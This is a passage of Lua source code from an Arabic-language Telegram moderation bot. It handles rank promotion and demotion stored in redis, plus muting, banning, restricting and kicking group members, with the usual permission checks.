bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*‹ : لا يمتلك رتبه بالفعل .*").yu,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*‹ : تم تنزيله بنجاح .*").i,"md",true)  
return false
end
end
end
if text and text:match("^رفع (.*) (.*)") and tonumber(msg.reply_to_message_id) == 0 then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
local infotxt = {text:match("^رفع (.*) (.*)")}
TextMsg = infotxt[1]
if msg.content.text then 
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:Up") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الرفع معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if redis:sismember(bot_id..srt1.."Status:"..srt,usetid) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*‹ : تم رفعه سابقا .*").i,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,usetid)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*‹ : تم رفعه بنجاح .*").i,"md",true)  
return false
end
end
end
if text and text:match("^تنزيل الكل (.*)") and tonumber(msg.reply_to_message_id) == 0 then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if Get_Rank(usetid,msg.chat_id)== "العضو" then
tt = "لا يمتلك رتبه بالفعل"
else
tt = "تم تنزيله من جميع الرتب بنجاح"
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..":Status:programmer",usetid)
redis:srem(bot_id..":Status:developer",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif programmer(msg) then
redis:srem(bot_id..":Status:developer",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif developer(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Creator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Creator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif BasicConstructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Constructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Owner(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",usetid)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Administrator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",usetid)
elseif Vips(msg) then
return false
else
return false
end
if bot.getChatMember(msg.chat_id,usetid).status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",usetid)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,"*‹ : "..tt.." .*").yu,"md",true)  
return false
end
end
if text and text:match('^الغاء كتم (.*)$') then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*‹ : تم الغاء كتمك بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":silent",usetid)
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).yu,"md",true)  
end
end
if text and text:match('^كتم (.*)$') then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الكتم معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if not Norank(usetid,msg.chat_id) then
t = "*‹ : لا يمكنك كتم "..Get_Rank(usetid,msg.chat_id).." .*"
else
t = "*‹ : تم كتمه بنجاح .*"
redis:sadd(bot_id..":"..msg.chat_id..":silent",usetid)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).i,"md",true)    
end
end
if text and text:match('^الغاء حظر (.*)$') then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
t = "*‹ : تم الغاء حظره بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":Ban",usetid)
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).i,"md",true)    
bot.setChatMemberStatus(msg.chat_id,usetid,'restricted',{1,1,1,1,1,1,1,1,1})
end
end
if text and text:match('^حظر (.*)$') then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الحظر معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
if not Norank(usetid,msg.chat_id) then
t = "*‹ : لا يمكنك حظر "..Get_Rank(usetid,msg.chat_id).." .*"
else
t = "*‹ : تم حظره بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,usetid,'banned',0)
redis:sadd(bot_id..":"..msg.chat_id..":Ban",usetid)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).i,"md",true)    
end
end
end
end
----------------------------------------------------------------------------------------------------
if Administrator(msg)  then
----------------------------------------------------------------------------------------------------
if text and text:match('^رفع القيود @(%S+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^رفع القيود @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", UserId_Info.id) then
redis:srem(bot_id..":"..msg.chat_id..":restrict",UserId_Info.id)
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", UserId_Info.id) then
redis:srem(bot_id..":"..msg.chat_id..":silent",UserId_Info.id)
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", UserId_Info.id) then
redis:srem(bot_id..":"..msg.chat_id..":Ban",UserId_Info.id)
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*‹ : تم رفع القيود عنه .*").i,"md",true)  
return false
end
if text and text:match('^رفع القيود (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^رفع القيود (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", UserName) then
redis:srem(bot_id..":"..msg.chat_id..":restrict",UserName)
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", UserName) then
redis:srem(bot_id..":"..msg.chat_id..":silent",UserName)
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", UserName) then
redis:srem(bot_id..":"..msg.chat_id..":Ban",UserName)
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*‹ : تم رفع القيود عنه .*").i,"md",true)  
return false
end
if text == "رفع القيود" and msg.reply_to_message_id ~= 0 then
Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", Remsg.sender.user_id) then
redis:srem(bot_id..":"..msg.chat_id..":restrict",Remsg.sender.user_id)
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", Remsg.sender.user_id) then
redis:srem(bot_id..":"..msg.chat_id..":silent",Remsg.sender.user_id)
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", Remsg.sender.user_id) then
redis:srem(bot_id..":"..msg.chat_id..":Ban",Remsg.sender.user_id)
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*‹ : تم رفع القيود عنه .*").i,"md",true)  
return false
end
if text and text:match('^كشف القيود @(%S+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^كشف القيود @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if redis:sismember(bot_id..":bot:Ban", UserId_Info.id) then
Banal = "‹ : الحظر العام : محظور بالفعل"
else
Banal = "‹ : الحظر العام : غير محظور"
end
if redis:sismember(bot_id..":bot:silent", UserId_Info.id) then
silental  = "‹ : كتم العام : مكتوم بالفعل"
else
silental = "‹ : كتم العام : غير مكتوم"
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", UserId_Info.id) then
rict = "‹ : التقييد : مقيد بالفعل"
else
rict = "‹ : التقييد : غير مقيد"
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", UserId_Info.id) then
sent = "\n‹ : الكتم : مكتوم بالفعل"
else
sent = "\n‹ : الكتم : غير مكتوم"
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", UserId_Info.id) then
an = "\n‹ : الحظر : محظور بالفعل"
else
an = "\n‹ : الحظر : غير محظور"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id," *ٴ━═━═━═━═━═━═━═━\n"..Banal.."\n"..silental.."\n"..rict..""..sent..""..an.." .*").i,"md",true)  
return false
end
if text and text:match('^كشف القيود (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^كشف القيود (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if redis:sismember(bot_id..":bot:Ban", UserName) then
Banal = "‹ : الحظر العام : محظور بالفعل"
else
Banal = "‹ : الحظر العام : غير محظور"
end
if redis:sismember(bot_id..":bot:silent", UserName) then
silental  = "‹ : كتم العام : مكتوم بالفعل"
else
silental = "‹ : كتم العام : غير مكتوم"
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", UserName) then
rict = "‹ : التقييد : مقيد بالفعل"
else
rict = "‹ : التقييد : غير مقيد"
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", UserName) then
sent = "\n‹ : الكتم : مكتوم بالفعل"
else
sent = "\n‹ : الكتم : غير مكتوم"
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", UserName) then
an = "\n‹ : الحظر : محظور بالفعل"
else
an = "\n‹ : الحظر : غير محظور"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*ٴ━═━═━═━═━═━═━═━\n"..Banal.."\n"..silental.."\n"..rict..""..sent..""..an.." .*").i,"md",true)  
return false
end
if text == "كشف القيود" and msg.reply_to_message_id ~= 0 then
Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if redis:sismember(bot_id..":bot:Ban", Remsg.sender.user_id) then
Banal = "‹ : الحظر العام : محظور بالفعل"
else
Banal = "‹ : الحظر العام : غير محظور"
end
if redis:sismember(bot_id..":bot:silent", Remsg.sender.user_id) then
silental  = "‹ : كتم العام : مكتوم بالفعل"
else
silental = "‹ : كتم العام : غير مكتوم"
end
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", Remsg.sender.user_id) then
rict = "‹ : التقييد : مقيد بالفعل"
else
rict = "‹ : التقييد : غير مقيد"
end
if redis:sismember(bot_id..":"..msg.chat_id..":silent", Remsg.sender.user_id) then
sent = "\n‹ : الكتم : مكتوم بالفعل"
else
sent = "\n‹ : الكتم : غير مكتوم"
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", Remsg.sender.user_id) then
an = "\n‹ : الحظر : محظور بالفعل"
else
an = "\n‹ : الحظر : غير محظور"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*ٴ━═━═━═━═━═━═━═━\n"..Banal.."\n"..silental.."\n"..rict..""..sent..""..an.." .*").i,"md",true)  
return false
end
if text and text:match('^تقييد (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^تقييد (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه تقييد الاعضاء* ',"md",true)  
return false
end
if not Norank(UserName,msg.chat_id) then
t = "*‹ : لا يمكنك تقييد "..Get_Rank(UserName,msg.chat_id).." .*"
else
t = "*‹ : تم تقييده بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,0,0,0,0,0,0,0,0})
redis:sadd(bot_id..":"..msg.chat_id..":restrict",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
end
if text and text:match('^تقييد @(%S+)$') then
local UserName = text:match('^تقييد @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه تقييد الاعضاء* ',"md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if not Norank(UserId_Info.id,msg.chat_id) then
t = "*‹ : لا يمكنك تقييد "..Get_Rank(UserId_Info.id,msg.chat_id).." .*"
else
t = "*‹ : تم تقييده بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,0,0,0,0,0,0,0,0})
redis:sadd(bot_id..":"..msg.chat_id..":restrict",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)    
end
if text == "تقييد" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه تقييد الاعضاء* ',"md",true)  
return false
end
if not Norank(Remsg.sender.user_id,msg.chat_id) then
t = "*‹ : لا يمكنك تقييد "..Get_Rank(Remsg.sender.user_id,msg.chat_id).." .*"
else
t = "*‹ : تم تقييده بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
redis:sadd(bot_id..":"..msg.chat_id..":restrict",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).i,"md",true)    
end
if text and text:match('^الغاء تقييد (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء تقييد (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*‹ : تم الغاء تقييده بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":restrict",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).i,"md",true)    
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^الغاء تقييد @(%S+)$') then
local UserName = text:match('^الغاء تقييد @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
t = "*‹ : تم الغاء تقييده بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":restrict",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).i,"md",true)  
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text == "الغاء تقييد" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
t = "*‹ : تم الغاء تقييده بنجاح .*"
redis:srem(bot_id..":"..msg.chat_id..":restrict",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).i,"md",true)    
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^طرد (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^طرد (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الطرد معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه طرد الاعضاء* ',"md",true)  
return false
end
if not Norank(UserName,msg.chat_id) then
t = "*‹ : لا يمكنك طرد "..Get_Rank(UserName,msg.chat_id).." .*"
else
t = "*‹ : تم طرده بنجاح .*"
